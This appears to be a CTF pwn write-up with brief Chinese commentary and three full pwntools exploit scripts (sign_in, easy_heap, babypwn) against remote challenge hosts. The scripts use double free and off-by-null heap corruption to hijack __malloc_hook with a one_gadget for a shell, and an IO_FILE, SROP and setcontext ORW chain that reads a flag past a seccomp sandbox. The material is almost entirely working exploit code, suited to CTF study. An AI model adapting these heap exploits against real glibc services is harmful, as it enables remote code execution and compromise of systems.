### sign_in
简单的UAF,一个double free 打到malloc_hook,然后realloc修栈
```python
from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('choice :',str(ch))
def new(size,name,content):
	menu(1)
	p.sendlineafter("game's name:",str(size))
	p.sendafter("game's name:",name)
	p.sendlineafter("game's message:",content)
def free(index):
	menu(3)
	p.sendlineafter('index:',str(index))
def show():
	menu(2)


p = process('./main')
#p =  remote('183.129.189.60',10029)
libc = ELF('./libc-2.23.so')
new(0x100,'FMYY','FMYY')
new(0x68,'FMYY','FMYY')
new(0x68,'FMYY','FMYY')
free(0)
new(0xD0,'\x78','\x78')
show()
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 88 - 0x10
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
rce = libc_base + 0xF1207
realloc = libc_base + libc.sym['realloc']
free(1)
free(2)
free(1)
new(0x68,p64(malloc_hook - 0x23),'FMYY')
new(0x68,'FMYY','FMYY')
new(0x68,'FMYY','FMYY')
new(0x68,'\x00'*(0x13-8) + p64(rce) + p64(realloc + 4),'FMYY')
menu(1)
p.interactive()
```

### easy_heap
简单的off by null,2.31的,然后有个沙盒,用malloc_hook + IO + SROP的劫持方法做即可 orw flag
```python
from pwn import*
context.arch = 'AMD64'
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('Choice:',str(ch))
def new(size):
	menu(1)
	p.sendlineafter('Size: ',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('Index:',str(index))
	p.sendafter('Content:',content)
def free(index):
	menu(3)
	p.sendlineafter('Index:',str(index))
def show(index):
	menu(4)
	p.sendlineafter('Index:',str(index))
p = process('./main')
p =  remote('183.129.189.60',10009)
libc =ELF('./libc-2.31.so')
for i in range(4):
	new(0x1000)
new(0x1000-0x3E0 - 0x50 + 0x10)
#--large bin
for i in range(7):
	new(0x28)
new(0xB20)
new(0x10)

free(12)
new(0x1000)
new(0x28) #14
edit(14,p64(0) + p64(0x521) + '\x40')
#--
#-- small bin 
new(0x28) #15
new(0x28) #16
new(0x28) #17
new(0x28) #18

for i in range(7): #5 - 11
	free(5+i)

free(17)
free(15)

for i in range(7):
	new(0x28)

new(0x400)  #15

new(0x28) #17
edit(17,p64(0) + '\x20')
new(0x28) # clear the tcache bin
#--

#--fast bin
for i in range(7):
	free(5 + i)
free(16)
free(14)
for i in range(7):
	new(0x28)
new(0x28)
edit(14,'\x20')
new(0x28)
#--
new(0x28) #20
new(0x5F8)
free(20)
new(0x28)
edit(20,'\x00'*0x20 + p64(0x520))
free(21)
new(0x40)
new(0x40)
show(16)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x60 -0x10 - libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
IO_stdin = libc_base +  libc.sym['_IO_2_1_stdin_']
free(22)
free(14)
new(0x28)
edit(14,p64(0) + p64(0x301))
new(0x2F0)
free(22)
free(21)
free(14)
new(0x28)
edit(14,'\x00'*0x10 + p64(IO_stdin))
################
pop_rdi_ret = libc_base + 0x0000000000026B72
pop_rdx_r12 = libc_base + 0x000000000011C1E1
pop_rsi_ret = libc_base + 0x0000000000027529
pop_rax_ret = libc_base + 0x000000000004A550
jmp_rsi  = libc_base + 0x00000000001105BD


syscall = libc_base + libc.sym['syscall']

target = libc_base + libc.sym['_IO_2_1_stdin_']
address = libc.sym['__free_hook'] + libc_base
IO_str_jumps = libc_base + 0x1ED560
frame_address = target + 0xE0

Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
free_hook = address
IO  = '\x00'*0x28
IO += p64(frame_address)
IO  = IO.ljust(0xD8,'\x00')
IO += p64(IO_str_jumps)
read = libc_base + libc.sym['read']
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = address
frame.rdx = 0x2000
frame.rsp = address
frame.rip = Read


orw  = p64(pop_rdi_ret)+p64(free_hook + 0xF8)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rdx_r12) + p64(0x30) + p64(0)
orw += p64(pop_rsi_ret) + p64(free_hook+0x100)
orw += p64(Read)
orw += p64(pop_rdi_ret)+p64(free_hook+0x100)
orw += p64(Puts)
orw  = orw.ljust(0xF8,'\x00')
orw += './flag\x00\x00'
IO += str(frame)
IO += 'F'*0x18 + p64(libc_base + libc.sym['setcontext'] + 61)
###############
new(0x2F0)
new(0x2F0)
log.success('Now')
edit(22,IO)
menu(5)
p.sendlineafter('bye bye!',orw)
p.interactive()
```

### babypwn
也是简单题,需要一个libc地址,释放一个块到fastbin,利用scanf输入数据过多会申请一个large bin chunk,故可以将fastbin中的chunk 放进small bin中,再申请回来拿到libc,一个double free申请过去即可打到malloc_hook
```python
from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('choice :',str(ch))
def new(size,name,content,sign=1):
	menu(1)
	p.sendlineafter("game's name:",str(size))
	p.sendafter("game's name:",name)
	if sign:
		p.sendlineafter("game's message:",content)
	else:
		p.sendline(content)
def free(index):
	menu(2)
	p.sendlineafter('index:',str(index))
	
p = process('./main')
p = remote('183.129.189.60',10031)
libc =ELF('./libc-2.23.so')
new(0x28,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
free(2)
menu(1)
p.sendlineafter("game's name:",'0'*0x500)
free(0)
new(0x60,'\xDD\x25','FMYY')
free(1)
free(3)
free(1)
new(0x60,'\x30','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'FMYY','FMYY')
new(0x60,'\x00'*0x33 + p64(0xFBAD1800) + p64(0)*3 + '\x88','FMYY',sign=0)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['_IO_2_1_stdin_']
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
rce = libc_base + 0xF1207
free(5)
free(6)
free(5)
new(0x68,p64(malloc_hook - 0x23),'FMYY')
new(0x68,'FMYY','FMYY')
new(0x68,'FMYY','FMYY')
new(0x68,'\x00'*(0x13-8) + p64(rce) + p64(realloc + 4),'FMYY')
menu(1)
p.interactive()
```
